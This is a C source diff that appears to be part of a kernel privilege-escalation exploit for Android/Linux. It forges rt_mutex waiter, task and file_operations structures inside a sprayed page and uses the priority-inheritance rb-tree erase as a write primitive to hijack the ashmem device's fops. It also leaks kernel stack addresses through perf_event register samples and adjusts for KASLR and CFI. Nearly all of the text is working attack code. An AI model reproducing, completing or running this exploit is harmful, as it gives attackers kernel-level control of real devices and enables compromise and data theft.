@@ -23,6 +23,11 @@ uint64_t fake_right;
 uint64_t fake_left;
 uint64_t fake_fops;
 uint64_t binwrite_target;
+/* PI-write triple for the setsockopt route (mode 4): same (pc, right, left) that
+ * prepare_skb_payload() puts into W0's pi_tree inside the fake page. */
+uint64_t ssopt_write_pc;
+uint64_t ssopt_write_right;
+uint64_t ssopt_write_left;
 char ashmem_path[256] = "/dev/ashmem";
 
 /* 2-write support */
@@ -153,7 +158,7 @@ void log_startup_context(void) {
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
              (unsigned long long)SLIDE_INIT_TASK,
              (unsigned long long)SLIDE_ROOT_TASK_GROUP,
-             (unsigned long long)SLIDE_SYSCTL_BOOTID);
+             (unsigned long long)SLIDE_SYSCTL_BOOTID);  fsync(1);     /* survive a later kill/panic */
 }
 
 void log_slide_child_context(void) {
@@ -305,6 +310,11 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
+  /* Known slide -> canonical image mapping (RW for .data), the same page as the
+   * linear alias but independent of the unknown loader phys delta.  See §22.2. */
+  if (kaslr_slide != 0) {
+    return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
+  }
   return p0_data_alias(image_addr);
 }
 
@@ -350,10 +360,13 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
   put64(p, off + FOPS_LLSEEK_OFF,
         fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-  put64(p, off + FOPS_READ_OFF, 0);
-  put64(p, off + FOPS_WRITE_OFF, 0);
-  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
-  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+  /* FIX_RW: configfs_{read,write}_bin_file are the OLD-style .read/.write
+   * ops (file,buf,count,ppos), not .{read,write}_iter.  Put them in the
+   * .read/.write slots; leave read_iter/write_iter = 0. */
+  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
+  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+  put64(p, off + FOPS_READ_ITER_OFF, 0);
+  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
   put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
   put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
   put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
@@ -514,7 +527,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
-  fake_fops = payload_base + FOPS_TABLE_OFF;
+  /* FOPS_AT_WRITE: the chain[11] walk empirically writes (page+0x319) =
+   * (fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF)|1 into *(ashmem_misc.fops),
+   * NOT write_pc.  Put the real fops table exactly there (built by the
+   * pre-CFI repair, after the walk has rearranged W0's pi_tree). */
+  fake_fops = payload_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1;
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     if (pselect_custom_write) {
       if (pselect_child_node) {
@@ -549,10 +566,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       }
     } else {
       fake_parent = fake_fops;
-      fake_right = data_addr(ASHMEM_MISC_FOPS);
+      fake_right = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
+                                      : data_addr(ASHMEM_MISC_FOPS);
+      if (env_flag("WRITE4_SCRATCH", 0))
+        fake_right = payload_base + SCRATCH_OFF + 0x40; /* harmless: our page */
       fake_left = 0;
     }
-    binwrite_target = payload_base + SCRATCH_OFF;
+    /* In-page scratch.  payload_base+0x800 == page_base-0x680, which is
+     * OUTSIDE this port's single 4 KB memfd page; keep the CFI test fully
+     * inside the page (payload_base+LOCK_OFF == page_base). */
+    binwrite_target = payload_base + LOCK_OFF + 0x700;
   } else {
     fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
     fake_right = fake_fops;
@@ -563,16 +586,23 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  uint64_t waiter_task = text_addr(INIT_TASK);
+  uint64_t waiter_task = env_flag("SSOPT_FAKE_TASK", 0) ? fake_task
+                                                        : data_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
+  uint64_t pi_top_task = env_flag("SSOPT_FAKE_TASK", 0) ? fake_task
+                                                        : data_addr(INIT_TASK);
   if (pselect_custom_write == 4) {
     /* Mode 4 fops redirect: W0's pi_tree drives the write.
      * pi_parent = fake_fops (parent for rb_set_parent)
      * pi_right = ASHMEM_MISC_FOPS (child that gets rb_set_parent called on it)
      * rb_set_parent(child=MISC_FOPS, parent=fake_fops) writes fake_fops|color to *MISC_FOPS */
-    write_pc = fake_fops;
-    write_right = data_addr(ASHMEM_MISC_FOPS);
+    { /* diagnostic: allow overriding the value written by mode-4 */
+      const char *wpt = getenv("WRITE_PC_TEST");
+      write_pc = (wpt && *wpt) ? strtoull(wpt, NULL, 0)
+                               : payload_base + FOPS_TABLE_OFF;  /* dummy node */
+    }
+    write_right = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
+                                     : data_addr(ASHMEM_MISC_FOPS);
     if (env_flag("WRITE4_SCRATCH", 0))
       write_right = payload_base + SCRATCH_OFF + 0x40; /* harmless: our page */
     write_left = 0;
@@ -586,6 +616,18 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     pi_top_task = SLIDE_INIT_TASK;
   }
 
+  /* Publish the PI-write triple for do_setsockopt_fake_lock_route().
+   * Usable only when rb_left == 0 (so rb_erase_cached() takes case 1) and both
+   * the value and the target are non-NULL; otherwise the route keeps the
+   * waiter's tree_entry zeroed and relies on chain[11] via W0's pi_tree. */
+  if (write_left == 0 && write_pc != 0 && write_right != 0) {
+    ssopt_write_pc = write_pc;
+    ssopt_write_right = write_right;
+    ssopt_write_left = write_left;
+  } else {
+    ssopt_write_pc = ssopt_write_right = ssopt_write_left = 0;
+  }
+
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
@@ -597,12 +639,26 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+      /* Design v3 (setsockopt route): owner = 0 so chain[9] "if
+       * (!rt_mutex_owner(lock))" ends the chain walk right after chain[7]
+       * already performed the write -- no fake_task / pi_waiters dependency.
+       * With owner != 0 the walk continues into [10]/[11] and reads
+       * waiter->task, the one field an IRQ can clobber on T's stack. */
+      put64(p, LOCK_OFF + 0x18,
+            env_flag("SSOPT_OWNER0", 1) ? 0 : (fake_task | 1));
     }
 
     put64(p, W0_OFF + 0x00, 1);
     put64(p, W0_OFF + 0x08, 0);
     put64(p, W0_OFF + 0x10, 0);
+    /* W0 is fake_lock->waiters.rb_leftmost (rt_mutex_top_waiter check: its
+     * ->lock@0x38 must equal fake_lock, set below).  Its prio must be BELOW the
+     * waiter's prio (= task->prio, the consumer sets nice=19 -> 139) so that
+     * rt_mutex_enqueue() sends W to W0's right: rb_leftmost then stays W0 and
+     * chain[9]'s "prerequeue_top_waiter != top_waiter" wake_up_process() is
+     * skipped. */
+    if (env_flag("SSOPT_OWNER0", 1))
+      put32(p, W0_OFF + 0x40, 100);
     int compact = active_offsets && active_offsets->waiter_compact;
     if (compact) {
       /* 4.14 rt_mutex_waiter: tree@0x00 pi_tree@0x18 task@0x30 lock@0x38 prio@0x40 deadline@0x48 */
@@ -636,14 +692,18 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         /* Mode 4 (fops redirect): pi_waiters points to W0's pi_tree.
          * rt_mutex_dequeue_pi will rb_erase W0's pi_tree entry,
          * causing rb_set_parent to write fake_fops to ASHMEM_MISC_FOPS. */
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-              fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-        /* rb_leftmost MUST differ from the erased node, otherwise
-         * __rb_erase_augmented() calls rb_next(node) which walks
-         * node->rb_right == data_addr(ASHMEM_MISC_FOPS) into the real
-         * miscdevice.  enqueue_pi() at rtmutex.c:724 restores it to
-         * &W->pi_tree afterwards, so task_top_pi_waiter() stays valid. */
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+        {
+          uint64_t piroot = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
+          uint64_t pileft = 0;
+          const char *e1 = getenv("RBROOT_OFF");
+          const char *e2 = getenv("RBLEFT_OFF");
+          if (e1) piroot = payload_base + strtoull(e1, NULL, 0);
+          if (e2) pileft = payload_base + strtoull(e2, NULL, 0);
+          pr_info("ssopt pi_waiters rb_root=%016llx rb_leftmost=%016llx\n",
+                  (unsigned long long)piroot, (unsigned long long)pileft);
+          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, piroot);
+          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, pileft);
+        }
       } else if (pselect_custom_write) {
         put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
         put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
@@ -680,6 +740,136 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
 static void log_sync(void) { fsync(1); }
 
+/* ============================================================================
+ * Leak the dangling waiter's kernel-stack address (RB_EMPTY_NODE route).
+ * ========================================================================== */
+static int ssopt_perf_fd = -1;
+static unsigned char *ssopt_perf_buf;
+static size_t ssopt_perf_msz;
+uint64_t ssopt_leaked_waiter;
+
+int ssopt_perf_begin(void) {
+  struct perf_event_attr pe;
+  memset(&pe, 0, sizeof(pe));
+  pe.type = PERF_TYPE_SOFTWARE;
+  pe.size = sizeof(pe);
+  pe.config = PERF_COUNT_SW_CPU_CLOCK;
+  /* keep well under kernel.perf_event_max_sample_rate (~80 kHz) so the burst
+   * never trips the hardware watchdog (see BAN_GIAO §18.2). */
+  pe.sample_period = (uint64_t)env_int_range("LEAK_PERIOD", 20000, 200, 1000000);
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
+  pe.sample_regs_intr = (1ULL << 32) - 1;
+  pe.disabled = 1;
+  pe.exclude_user = 1;
+  pe.exclude_hv = 1;
+  pe.exclude_idle = 1;
+  ssopt_perf_fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  if (ssopt_perf_fd < 0) { pr_warning("perf_event_open(waiter) errno=%d\n", errno); return -1; }
+  ssopt_perf_msz = PAGE_SIZE * 33;
+  ssopt_perf_buf = mmap(0, ssopt_perf_msz, PROT_READ | PROT_WRITE, MAP_SHARED,
+                        ssopt_perf_fd, 0);
+  if (ssopt_perf_buf == MAP_FAILED) {
+    ssopt_perf_buf = NULL; close(ssopt_perf_fd); ssopt_perf_fd = -1;
+    pr_warning("perf mmap(waiter) errno=%d\n", errno); return -1;
+  }
+  ioctl(ssopt_perf_fd, PERF_EVENT_IOC_ENABLE, 0);
+  return 0;
+}
+
+static int ssopt_ip_in(uint64_t ip, uint64_t sym_off, uint64_t len) {
+  uint64_t a = ip & 0x1fffffULL, b = sym_off & 0x1fffffULL;
+  return (a >= b && a - b < len);
+}
+
+/* --- accumulators across drains (mode over accepted candidates) --- */
+static uint64_t wl_cand[16];
+static int wl_cnt[16], wl_nc;
+static int wl_samples, wl_insock, wl_insys;
+static int wl_ring_lost;
+static uint64_t wl_lo_hist[256];                 /* SP & 0x3fff histogram */
+static uint64_t wl_abi_hist[4];                  /* abi histogram */
+static uint64_t wl_lo_mask = 0x3d10;             /* waiter mod 0x4000 (measured) */
+
+void ssopt_set_waiter_lo(void) {
+  char *e = getenv("WAITER_LO14");
+  if (e) wl_lo_mask = strtoul(e, 0, 0);
+}
+
+void ssopt_perf_drain(void) {
+  if (ssopt_perf_fd < 0 || !ssopt_perf_buf) return;
+  struct perf_event_mmap_page *hdr = (void *)ssopt_perf_buf;
+  uint64_t head = hdr->data_head;
+  __sync_synchronize();
+  unsigned char *base = ssopt_perf_buf + PAGE_SIZE;
+  size_t dsz = ssopt_perf_msz - PAGE_SIZE;
+  uint64_t pos = hdr->data_tail;
+  int scanned = 0;
+  while (pos < head && scanned < 20000) {
+    struct perf_event_header *ev = (void *)(base + (pos % dsz));
+    if (ev->size == 0) break;
+    scanned++;
+    if (ev->type == PERF_RECORD_SAMPLE) {
+      wl_samples++;
+      unsigned char *p = (unsigned char *)ev + sizeof(*ev);
+      uint64_t ip = *(uint64_t *)p; p += 8;
+      uint64_t abi = *(uint64_t *)p; p += 8;
+      if (abi < 4) wl_abi_hist[abi]++;
+      if (abi == 2) {                       /* PERF_SAMPLE_REGS_ABI_64 */
+        uint64_t sp = ((uint64_t *)p)[31];
+        uint64_t lo = sp & 0x3fffULL;
+        wl_lo_hist[lo & 0xff]++;               /* residue histogram (calibration) */
+        uint64_t w = (sp & ~0x3fffULL) | (wl_lo_mask & 0x3fffULL);
+        (void)ip;
+        if ((w >> 32) == 0xffffff80ULL) {
+          wl_insock++;                          /* accepted */
+          int k = -1;
+          for (int t = 0; t < wl_nc; t++) if (wl_cand[t] == w) { k = t; break; }
+          if (k >= 0) wl_cnt[k]++;
+          else if (wl_nc < 16) { wl_cand[wl_nc] = w; wl_cnt[wl_nc] = 1; wl_nc++; }
+        }
+      }
+    } else if (ev->type == PERF_RECORD_LOST) {
+      wl_ring_lost++;
+    }
+    pos += ev->size;
+  }
+  hdr->data_tail = pos;
+}
+
+uint64_t ssopt_perf_result(void) {
+  uint64_t best = 0; int bestn = 0;
+  for (int t = 0; t < wl_nc; t++)
+    if (wl_cnt[t] > bestn) { bestn = wl_cnt[t]; best = wl_cand[t]; }
+  pr_info("waiter leak: samples=%d accepted=%d cands=%d best=%016zx x%d "
+          "lost=%d lo=0x%zx\n",
+          wl_samples, wl_insock, wl_nc, (uintptr_t)best, bestn, wl_ring_lost,
+          (size_t)wl_lo_mask);
+  pr_info("  abi hist: none=%d a32=%d a64=%d x=%d\n",
+          (int)wl_abi_hist[0], (int)wl_abi_hist[1], (int)wl_abi_hist[2],
+          (int)wl_abi_hist[3]);
+  {   /* top-3 SP residues: lets us calibrate WAITER_LO14 from the log */
+    for (int r = 0; r < 3; r++) {
+      uint64_t bv = 0; int bi = -1;
+      for (int t = 0; t < 256; t++) if (wl_lo_hist[t] > bv) { bv = wl_lo_hist[t]; bi = t; }
+      if (bi < 0 || bv == 0) break;
+      pr_info("  sp&0x3fff hist[%d] = %d\n", bi, (int)bv);
+      wl_lo_hist[bi] = 0;
+    }
+  }
+  return best;
+}
+
+void ssopt_perf_close(void) {
+  if (ssopt_perf_fd >= 0) {
+    ioctl(ssopt_perf_fd, PERF_EVENT_IOC_DISABLE, 0);
+    if (ssopt_perf_buf) munmap(ssopt_perf_buf, ssopt_perf_msz);
+    close(ssopt_perf_fd);
+  }
+  ssopt_perf_buf = NULL;
+  ssopt_perf_fd = -1;
+}
+
+
 static long mm_slab_num_slabs(void) {
   FILE *f = fopen("/proc/slabinfo", "r");
   if (!f) return -1;
@@ -703,6 +893,62 @@ static long mm_slab_num_slabs(void) {
  * ========================================================================== */
 static int perf_page_fd = -1;
 static unsigned char *perf_page_map;
+
+/* Rewrite the fake fops table inside our page (MAP_SHARED) after the walk.
+ * The rb-tree PI write clobbers slots of the table (llseek at least, observed
+ * owner too), and misc_open() reads c->fops->owner right away -> rewrite the
+ * whole table with the correct (slid) pointers before opening /dev/ashmem. */
+void ssopt_repair_fake_fops_page(void) {
+  if (!perf_page_map || !fake_fops) return;
+  size_t poff = (size_t)((W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1) - LOCK_OFF); /* fake_fops page off */
+  unsigned char *p = perf_page_map + poff;
+  uint64_t owner_before = *(volatile uint64_t *)(p + FOPS_OWNER_OFF);
+  pr_info("ssopt fops page dump pg[0x100..0x13f] / pg[0x300..0x33f]:");
+  for (int q = 0; q < 0x40; q += 8) {
+    pr_info("  pg[%03x]=%016llx  pg[%03x]=%016llx",
+            0x100+q, (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x100+q),
+            0x300+q, (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x300+q));
+  }
+  pr_info("DIAG writeval pg3c0=%016llx pg318=%016llx pg320=%016llx pg328=%016llx",
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x3c0),
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x318),
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x320),
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x328));
+  pr_info("  fops slots: owner=%016llx llseek=%016llx read_iter=%016llx "
+          "write_iter=%016llx ioctl=%016llx open=%016llx release=%016llx\n",
+          (unsigned long long)*(volatile uint64_t *)(p+FOPS_OWNER_OFF),
+          (unsigned long long)*(volatile uint64_t *)(p+FOPS_LLSEEK_OFF),
+          (unsigned long long)*(volatile uint64_t *)(p+FOPS_READ_ITER_OFF),
+          (unsigned long long)*(volatile uint64_t *)(p+FOPS_WRITE_ITER_OFF),
+          (unsigned long long)*(volatile uint64_t *)(p+FOPS_IOCTL_OFF),
+          (unsigned long long)*(volatile uint64_t *)(p+FOPS_OPEN_OFF),
+          (unsigned long long)*(volatile uint64_t *)(p+FOPS_RELEASE_OFF));
+  pr_info("  wp=%016llx wr=%016llx wl=%016llx fake_fops=%016llx fake_w0=%016llx base?=%016llx",
+          (unsigned long long)ssopt_write_pc, (unsigned long long)ssopt_write_right,
+          (unsigned long long)ssopt_write_left, (unsigned long long)fake_fops,
+          (unsigned long long)fake_w0, (unsigned long long)(fake_fops - (FOPS_TABLE_OFF-LOCK_OFF)));
+  fsync(1);
+  put64(p, FOPS_OWNER_OFF, 0);
+  put64(p, FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
+  put64(p, FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
+  put64(p, FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+  put64(p, FOPS_READ_ITER_OFF, 0);
+  put64(p, FOPS_WRITE_ITER_OFF, 0);
+  put64(p, FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
+  put64(p, FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
+  put64(p, FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
+  put64(p, FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
+  put64(p, FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
+  put64(p, FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
+  put64(p, FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
+  pr_info("ssopt fops page repair: poff=%#zx owner_before=%016llx "
+          "llseek=%016llx open=%016llx\n",
+          poff, (unsigned long long)owner_before,
+          (unsigned long long)text_addr(NOOP_LLSEEK),
+          (unsigned long long)text_addr(ASHMEM_OPEN));
+  fsync(1);
+}
+
 
 static uintptr_t leak_page_via_perf(void)
 {
@@ -771,6 +1017,17 @@ static uintptr_t leak_page_via_perf(void)
   return (uintptr_t)cand[bi];
 }
 
+/* Read back a qword of the leaked fake page through the userspace MAP_SHARED
+ * mapping (same page-cache page the kernel writes to via its direct-map alias).
+ * Used by the mode-4 setsockopt route to VERIFY the PI write without touching
+ * ashmem: with WRITE4_SCRATCH=1 write_right is inside our page, so after a
+ * successful walk page[SCRATCH_OFF+0x40] must equal the value we painted as
+ * tree.parent_color (== fake_fops). */
+uint64_t ssopt_page_readback(size_t off) {
+  if (!perf_page_map || off + sizeof(uint64_t) > PAGE_SIZE) return 0;
+  return *(volatile uint64_t *)(perf_page_map + off);
+}
+
 uintptr_t prepare_perf_fake_page(int payload_mode)
 {
   if (perf_page_fd < 0) {
@@ -795,9 +1052,19 @@ uintptr_t prepare_perf_fake_page(int payload_mode)
 
   prepare_skb_payload(base, payload_mode);     /* fills skb_buf; fake_lock==base */
   memcpy(perf_page_map, skb_buf + LOCK_OFF, PAGE_SIZE);  /* image at page offset 0 */
+  pr_info("build pg100=%016llx pg108=%016llx pg318=%016llx pg320=%016llx pg328=%016llx "
+          "(wr=%016llx wp=%016llx)\n",
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x100),
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x108),
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x318),
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x320),
+          (unsigned long long)*(volatile uint64_t *)(perf_page_map+0x328),
+          (unsigned long long)ssopt_write_right, (unsigned long long)ssopt_write_pc);
+  fsync(1);
 
   pr_info("prepare_perf_fake_page ok base=%016zx lock=%016zx task=%016zx fops=%016zx\n",
           base, fake_lock, fake_task, fake_fops);
+  log_sync();
   return base;
 }
 
